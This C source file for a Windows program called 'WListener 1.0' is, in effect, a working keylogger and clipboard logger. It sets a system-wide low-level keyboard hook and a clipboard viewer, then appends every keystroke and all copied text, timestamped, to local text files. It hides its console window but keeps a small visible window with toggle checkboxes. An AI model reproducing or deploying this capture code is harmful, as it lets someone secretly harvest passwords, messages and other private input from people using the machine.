#include <windows.h>
#include <stdio.h>
#define listenClipboardID 0
#define listenKeystrokesID 1

HHOOK hook = 0;

const TCHAR newLine[2] = {13, 10};

LRESULT CALLBACK keyProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
 if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 {
  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
  DWORD key = p->vkCode;
  UINT ch = MapVirtualKey(key, MAPVK_VK_TO_CHAR) != 0 ? MapVirtualKey(key, MAPVK_VK_TO_CHAR) : key;
  TCHAR hex[7];
  sprintf(hex, "0x%X %c", key, ch);
  SYSTEMTIME st;
  GetLocalTime(&st);
  int dateSize = GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
  TCHAR date[dateSize];
  GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, &date[0], dateSize);
  int timeSize = GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
  TCHAR time[timeSize];
  GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, &time[0], timeSize);
  HANDLE hFile = CreateFile("keystrokes.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  WriteFile(hFile, date, dateSize - 1, NULL, NULL);
  WriteFile(hFile, " ", 1, NULL, NULL);
  WriteFile(hFile, time, timeSize - 1, NULL, NULL);
  WriteFile(hFile, ": ", 2, NULL, NULL);
  WriteFile(hFile, hex, 6, NULL, NULL);
  WriteFile(hFile, newLine, 2, NULL, NULL);
  CloseHandle(hFile);
 }
 return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam) 
{
 switch(Message)
 {
 	
  case WM_CREATE : 
  {		 
   SetWindowLongA(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);		 
   CreateWindow("BUTTON", "Listen clipboard", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 10, 160, 25, hWnd, (HMENU) listenClipboardID, NULL, NULL);
   CreateWindow("BUTTON", "Listen keystrokes", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 40, 160, 25, hWnd, (HMENU) listenKeystrokesID, NULL, NULL);
   break;
  }
    	 
  case WM_PAINT : 
  {
   PAINTSTRUCT ps;
   HDC hdc = BeginPaint(hWnd, &ps);
   FillRect(hdc, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW + 1));
   EndPaint(hWnd, &ps);
   break;
  }
    	    	
  case WM_CTLCOLORSTATIC : 
  {
   SetBkMode((HDC) wParam, TRANSPARENT);
   return (LRESULT) GetStockObject(NULL_BRUSH);
   break;
  }
		
  case WM_CLOSE : 
  {
   ChangeClipboardChain(hWnd, NULL);
   UnhookWindowsHookEx(hook);
   PostQuitMessage(0);
   break;
  }
		
  case WM_COMMAND : 
  {
   if(wParam == listenClipboardID) 
   {
    if(IsDlgButtonChecked(hWnd, listenClipboardID) == BST_UNCHECKED) 
    {
     CheckDlgButton(hWnd, listenClipboardID, BST_CHECKED);
     SetClipboardViewer(hWnd);
    }
    else 
    {
     CheckDlgButton(hWnd, listenClipboardID, BST_UNCHECKED);
     ChangeClipboardChain(hWnd, NULL);
    }
   }
   if(wParam == listenKeystrokesID) 
   {
    if(IsDlgButtonChecked(hWnd, listenKeystrokesID) == BST_UNCHECKED) 
    {
     CheckDlgButton(hWnd, listenKeystrokesID, BST_CHECKED);
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyProc, NULL, 0);
    }
    else 
    {
     CheckDlgButton(hWnd, listenKeystrokesID, BST_UNCHECKED);
     UnhookWindowsHookEx(hook);
    }
   }
   break;
  }
  
  case WM_DRAWCLIPBOARD :
  {
   if(OpenClipboard(hWnd))
   {
    HANDLE clipData = GetClipboardData(CF_UNICODETEXT);
    LPCWSTR clipTextWide = (LPCWSTR) GlobalLock(clipData);
    GlobalUnlock(clipData);
    CloseClipboard();
    if(clipTextWide != NULL)
    {
     int clipTextSize = WideCharToMultiByte(CP_UTF8, 0, clipTextWide, -1, NULL, 0, NULL, NULL);
     TCHAR clipText[clipTextSize];
     WideCharToMultiByte(CP_UTF8, 0, clipTextWide, -1, &clipText[0], clipTextSize, NULL, NULL);
     SYSTEMTIME st;
     GetLocalTime(&st);
     int dateSize = GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
     TCHAR date[dateSize];
     GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, &date[0], dateSize);
     int timeSize = GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
     TCHAR time[timeSize];
     GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, &time[0], timeSize);
     HANDLE hFile = CreateFile("clipboard.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     WriteFile(hFile, date, dateSize - 1, NULL, NULL);
     WriteFile(hFile, " ", 1, NULL, NULL);
     WriteFile(hFile, time, timeSize - 1, NULL, NULL);
     WriteFile(hFile, ":", 1, NULL, NULL);
     WriteFile(hFile, newLine, 2, NULL, NULL);
     WriteFile(hFile, clipText, clipTextSize - 1, NULL, NULL);
     WriteFile(hFile, newLine, 2, NULL, NULL);
     CloseHandle(hFile);
    }
   }
   break; 
  }
			 
  default :
  return DefWindowProc(hWnd, Message, wParam, lParam);
 }
 return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
 ShowWindow(GetConsoleWindow(), SW_HIDE);
 WNDCLASSEX wc = {};
 wc.cbSize = sizeof(WNDCLASSEX);
 wc.lpfnWndProc = WndProc; 
 wc.hInstance = hInstance;
 wc.lpszClassName = "WindowClass";
 if(!RegisterClassEx(&wc)) { return 0; }
 HWND hWnd = CreateWindowEx(0, "WindowClass", "WListener 1.0", WS_VISIBLE | WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 250, 100, NULL, NULL, hInstance, NULL);
 if(hWnd == NULL) { return 0; }
 MSG msg = {};
 while(GetMessage(&msg, NULL, 0, 0) > 0) 
 { 
  TranslateMessage(&msg); 
  DispatchMessage(&msg); 
 }
 return 0;
}
